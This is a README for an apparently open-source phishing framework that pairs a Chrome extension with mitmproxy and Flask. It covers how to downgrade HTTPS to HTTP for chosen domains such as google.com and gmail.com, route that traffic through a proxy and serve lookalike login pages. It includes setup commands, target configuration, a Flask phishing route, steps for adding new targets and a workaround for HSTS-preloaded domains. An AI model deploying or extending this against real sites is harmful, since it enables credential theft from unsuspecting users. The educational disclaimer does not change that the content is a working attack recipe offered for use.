# CRXPhish

> **Open-source Chrome extension research framework for studying HTTPS downgrade + proxy-based phishing attacks using mitmproxy.**

> **Disclaimer:** This project is for **educational and authorized security research only**. Do not use it against systems you do not own or have explicit permission to test.

---

## How It Works

```
┌──────────────┐       HTTPS → HTTP        ┌────────────┐       route match       ┌───────────────┐
│   Browser    │ ──────────────────────────►│  mitmproxy │ ─────────────────────►  │  Flask API    │
│  + Extension │   declarativeNetRequest    │  (port 8080)│   fetches internal     │  (port 9000)  │
└──────────────┘   + PAC proxy config       └────────────┘   route response        └───────────────┘
                                                                                     │
                                                                                     ▼
                                                                              templates/*.html
                                                                            (phishing pages)
```

1. The **Chrome extension** uses `declarativeNetRequest` to redirect HTTPS → HTTP for configured domains.
2. A **PAC script** routes those HTTP requests through the **mitmproxy** listener.
3. The **mitmproxy addon** (`proxy.py`) intercepts requests, matches the domain against `config.json`, and fetches the response from an internal **Flask route**.
4. Flask serves a phishing page from `templates/` back through the proxy to the browser.

---

## Project Structure

```
crxphish/
├── backend/
│   ├── run.py            # Main entry-point — starts Flask + mitmproxy
│   ├── api.py            # Flask API with internal phishing routes
│   ├── proxy.py          # mitmproxy addon (intercepts & reroutes)
│   ├── utils.py          # Helpers: config loader, domain parser, rule builder
│   ├── config.json       # Domain → route mappings & port settings
│   ├── requirements.txt  # Python dependencies
│   └── templates/        # Phishing page HTML templates
│       ├── google.html
│       ├── gmail.html
│       └── default.html
└── extension/
    ├── manifest.json     # Chrome MV3 extension manifest
    └── background.js     # Service worker: fetches rules, sets proxy
```

---

## Prerequisites

- **Python 3.10+**
- **pip**
- **mitmproxy** (`mitmdump` must be on PATH)
- **Google Chrome** or Chromium-based browser

---

## Setup

### 1. Clone the repository

```bash
git clone https://github.com/youruser/crxphish.git
cd crxphish
```

### 2. Install Python dependencies

```bash
cd backend
pip install -r requirements.txt
```

### 3. Verify mitmproxy is installed

```bash
mitmdump --version
```

If not found, install it:

```bash
pip install mitmproxy
```

### 4. Configure targets

Edit `backend/config.json`:

```json
{
    "proxy_port": 8080,
    "api_port": 9000,
    "internal_host": "http://127.0.0.1:9000",
    "settings": {
        "google.com": {
            "route": "/phish/google"
        },
        "gmail.com": {
            "route": "/phish/gmail",
            "hsts": true
        },
        "example.com": {
            "route": "/phish/default"
        }
    }
}
```

- **Key** = domain to intercept
- **route** = internal Flask route that serves the phishing page
- **hsts** = set to `true` for HSTS-preloaded domains (see below)

### 5. Add the matching Flask route (if new)

In `backend/api.py`:

```python
@app.route('/phish/example', methods=['GET', 'POST'])
def phish_example():
    return render_template('example.html')
```

Then create `backend/templates/example.html` with your HTML.

---

## Running

### Start the backend (Flask + mitmproxy)

```bash
cd backend
python run.py
```

Override ports:

```bash
python run.py --proxy-port 8080 --api-port 9000
```

Or run each component separately:

```bash
# Terminal 1 — Flask API
python api.py

# Terminal 2 — mitmproxy
mitmdump -p 8080 --mode regular -s proxy.py
```

### Load the Chrome extension

1. Open `chrome://extensions/`
2. Enable **Developer mode** (toggle in top right)
3. Click **Load unpacked** → select the `extension/` folder
4. The extension icon should appear in the toolbar

---

## Testing

1. Start the backend with `python run.py`
2. Load the extension in Chrome
3. Navigate to `https://google.com`
4. The extension downgrades to HTTP and routes through mitmproxy
5. mitmproxy serves the phishing page from Flask

---

## Adding a New Target

| Step | File | Action |
|------|------|--------|
| 1 | `config.json` | Add `"target.com": { "route": "/phish/target" }` to `settings` |
| 2 | `api.py` | Add a Flask route for `/phish/target` |
| 3 | `templates/target.html` | Create the phishing HTML template |
| 4 | Restart | `python run.py` |

The extension automatically fetches updated rules from the API on install/reload.

---

## Configuration Reference

| Field | Description | Default |
|-------|-------------|---------|  
| `proxy_port` | Port mitmproxy listens on | `8080` |
| `api_port` | Port Flask API listens on | `9000` |
| `internal_host` | Base URL for internal route resolution | `http://127.0.0.1:9000` |
| `settings` | Map of `domain` → `{ route, hsts? }` | — |

---

## HSTS Preloaded Domains

Some domains (e.g. `gmail.com`, `paypal.com`, `facebook.com`) are on Chrome's **HSTS preload list**. Chrome hardcodes these domains to **always use HTTPS** — any attempt to load them over HTTP is automatically upgraded back to HTTPS before the request leaves the browser. This makes the normal HTTPS → HTTP downgrade approach impossible.

**Check if a domain is HSTS preloaded:**

https://hstspreload.org

For example: https://hstspreload.org/?domain=gmail.com

**How it differs:**

| | Normal domain | HSTS domain |
|---|---|---|
| **Extension action** | Redirect to `http://domain.com` | Redirect to `http://127.0.0.1:9000/phish/...` |
| **Traffic flow** | Goes through mitmproxy | Goes directly to Flask |
| **Address bar shows** | `domain.com` | `127.0.0.1:9000/phish/...` |

> **Note:** For HSTS domains, the address bar will show the internal server address instead of the target domain. This is a browser limitation that cannot be bypassed.

---

## License

This project is released for educational and research purposes only.
